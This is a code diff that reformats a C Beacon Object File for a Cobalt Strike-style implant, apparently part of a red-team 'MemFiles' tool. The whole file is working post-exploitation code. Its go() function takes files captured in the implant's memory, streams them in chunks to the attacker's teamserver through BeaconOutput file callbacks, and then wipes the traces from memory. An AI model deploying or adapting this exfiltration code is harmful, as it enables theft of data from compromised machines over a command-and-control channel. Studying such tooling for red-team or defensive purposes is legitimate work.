@@ -1,16 +1,17 @@
-#include <windows.h>
 #include <stdio.h>
-#include "bofdefs.h"
-#include "beacon.h"
+#include <windows.h>
+
 #include "Base.c"
+#include "beacon.h"
+#include "bofdefs.h"
 
-struct FileInfo *pFileInfo = NULL;
+struct FileInfo* pFileInfo = NULL;
 
-void downloadFile(char* fileName, int downloadFileNameLength, char* returnData, int fileSize)
-{
+void downloadFile(char* fileName, int downloadFileNameLength, char* returnData,
+                  int fileSize) {
     // intializes the random number generator
     time_t t;
-    srand((unsigned) time(&t));
+    srand((unsigned)time(&t));
 
     int chunkSize = 1024 * 900;
 
@@ -37,14 +38,14 @@ void downloadFile(char* fileName, int downloadFileNameLength, char* returnData, 
     packedData[7] = (fileSize >> 0x00) & 0xFF;
 
     // pack on the file name last
-    for (int i = 0; i < downloadFileNameLength; i++)
-    {
+    for (int i = 0; i < downloadFileNameLength; i++) {
         packedData[8 + i] = fileName[i];
     }
 
     // tell the teamserver that we want to download a file
     BeaconOutput(CALLBACK_FILE, packedData, messageLength);
-    free(packedData); packedData = NULL;
+    free(packedData);
+    packedData = NULL;
 
     // we use the same memory region for all chucks
     int chunkLength = 4 + chunkSize;
@@ -57,20 +58,21 @@ void downloadFile(char* fileName, int downloadFileNameLength, char* returnData, 
     packedChunk[3] = (fileId >> 0x00) & 0xFF;
 
     ULONG32 exfiltrated = 0;
-    while (exfiltrated < fileSize)
-    {
+    while (exfiltrated < fileSize) {
         // send the file content by chunks
-        chunkLength = fileSize - exfiltrated > chunkSize ? chunkSize : fileSize - exfiltrated;
+        chunkLength = fileSize - exfiltrated > chunkSize
+                          ? chunkSize
+                          : fileSize - exfiltrated;
         ULONG32 chunkIndex = 4;
-        for (ULONG32 i = exfiltrated; i < exfiltrated + chunkLength; i++)
-        {
+        for (ULONG32 i = exfiltrated; i < exfiltrated + chunkLength; i++) {
             packedChunk[chunkIndex++] = returnData[i];
         }
         // send a chunk
         BeaconOutput(CALLBACK_FILE_WRITE, packedChunk, 4 + chunkLength);
         exfiltrated += chunkLength;
     }
-    free(packedChunk); packedChunk = NULL;
+    free(packedChunk);
+    packedChunk = NULL;
 
     // tell the teamserver that we are done writing to this fileId
     char packedClose[4];
@@ -80,77 +82,83 @@ void downloadFile(char* fileName, int downloadFileNameLength, char* returnData, 
     packedClose[3] = (fileId >> 0x00) & 0xFF;
     BeaconOutput(CALLBACK_FILE_CLOSE, packedClose, 4);
 }
-void go(char *args, int argc)
-{
-    if(!bofstart())
-        return;
+void go(char* args, int argc) {
+    if (!bofstart()) return;
 
     datap parser;
     pFileInfo = BeaconGetValue(MF_FILE_INFO_KEY);
     BOOL force = BeaconDataInt(&parser);
-    if(!pFileInfo)
-    {
-        BeaconPrintf(CALLBACK_ERROR, "[X] Failed to call BeaconGetValue! Maybe no run meminit?\n");
+    if (!pFileInfo) {
+        BeaconPrintf(
+            CALLBACK_ERROR,
+            "[X] Failed to call BeaconGetValue! Maybe no run meminit?\n");
         return;
     }
 
-    if(pFileInfo->numFiles > 0)
-    {
+    if (pFileInfo->numFiles > 0) {
         int filesfetched = 0;
-        for (int i = 0; i < 100; i++)
-        {
-            if(pFileInfo->filehandle[i] != NULL)
-            {
-                size_t required_size = WideCharToMultiByte(CP_UTF8, 0, 
-                        pFileInfo->filename[i], -1, NULL, 0, NULL, NULL);
+        for (int i = 0; i < 100; i++) {
+            if (pFileInfo->filehandle[i] != NULL) {
+                size_t required_size =
+                    WideCharToMultiByte(CP_UTF8, 0, pFileInfo->filename[i], -1,
+                                        NULL, 0, NULL, NULL);
 
                 char* filename = calloc(required_size + 1, sizeof(char));
 
-				WideCharToMultiByte(CP_UTF8, 0, 
-                        pFileInfo->filename[i], -1, filename, required_size, NULL, NULL);
+                WideCharToMultiByte(CP_UTF8, 0, pFileInfo->filename[i], -1,
+                                    filename, required_size, NULL, NULL);
 
+                if (pFileInfo->fileclosed[i] == TRUE || force) {
+                    if (force)
+                        BeaconPrintf(CALLBACK_OUTPUT,
+                                     "[*] Force Download Memfiles!\n");
 
-				if(pFileInfo->fileclosed[i] == TRUE || force)
-				{
-                    if(force)
-                        BeaconPrintf(CALLBACK_OUTPUT, "[*] Force Download Memfiles!\n");
+                    BeaconPrintf(CALLBACK_OUTPUT, "[+] Start Download %s\n",
+                                 filename);
+                    downloadFile(filename, strlen(filename),
+                                 pFileInfo->filedata[i],
+                                 pFileInfo->filedatalen[i]);
 
-                    BeaconPrintf(CALLBACK_OUTPUT, "[+] Start Download %s\n", filename);
-					downloadFile(filename, strlen(filename), pFileInfo->filedata[i], pFileInfo->filedatalen[i]);
+                    // Now free all of the FileInfo entires associated with the
+                    // file since it has been downloaded/sent to the TS.
+                    memset(pFileInfo->filename[i], 0,
+                           ((wcslen(pFileInfo->filename[i]) + 1) * 2));
+                    free(pFileInfo->filename[i]);
+                    pFileInfo->filename[i] = NULL;
 
-					//Now free all of the FileInfo entires associated with the file since it has been downloaded/sent to the TS. 
-					memset(pFileInfo->filename[i], 0, ((wcslen(pFileInfo->filename[i]) + 1) * 2));
-					free(pFileInfo->filename[i]);
-					pFileInfo->filename[i] = NULL;
+                    memset(pFileInfo->filedata[i], 0,
+                           pFileInfo->fileallocationlen[i]);
+                    free(pFileInfo->filedata[i]);
+                    pFileInfo->filedata[i] = NULL;
 
-					memset(pFileInfo->filedata[i], 0, pFileInfo->fileallocationlen[i]);
-					free(pFileInfo->filedata[i]);
-					pFileInfo->filedata[i] = NULL;
+                    pFileInfo->filehandle[i] = NULL;
+                    pFileInfo->fileallocationlen[i] = 0;
+                    pFileInfo->filedatalen[i] = 0;
+                    pFileInfo->fileclosed[i] = FALSE;
 
-					pFileInfo->filehandle[i] = NULL;
-					pFileInfo->fileallocationlen[i] = 0;
-					pFileInfo->filedatalen[i] = 0;
-					pFileInfo->fileclosed[i] = FALSE;
-					
-					//Track how many files we have downloaded and cleared from memory
-					filesfetched++;
-                    BeaconPrintf(CALLBACK_OUTPUT, "[+] %s Download Successfully!\n", filename);
-				}
+                    // Track how many files we have downloaded and cleared from
+                    // memory
+                    filesfetched++;
+                    BeaconPrintf(CALLBACK_OUTPUT,
+                                 "[+] %s Download Successfully!\n", filename);
+                }
                 free(filename);
             }
         }
 
-        
-		pFileInfo->numFiles = pFileInfo->numFiles - filesfetched;
-		BeaconPrintf(CALLBACK_OUTPUT, "\n[+] Downloaded and cleaned up %d files from memory!\n[+] %d files remaining in memory as tracked by MemFiles!\n", 
-                filesfetched, pFileInfo->numFiles);
+        pFileInfo->numFiles = pFileInfo->numFiles - filesfetched;
+        BeaconPrintf(
+            CALLBACK_OUTPUT,
+            "\n[+] Downloaded and cleaned up %d files from memory!\n[+] %d "
+            "files remaining in memory as tracked by MemFiles!\n",
+            filesfetched, pFileInfo->numFiles);
 
-    }else{
-        BeaconPrintf(CALLBACK_OUTPUT,"[-] No files currently stored by MemFiles!\n");
+    } else {
+        BeaconPrintf(CALLBACK_OUTPUT,
+                     "[-] No files currently stored by MemFiles!\n");
         /* internal_printf("[-] No files currently stored by MemFiles!\n"); */
     }
-   
+
     /* printoutput(TRUE); */
     return;
-
 }
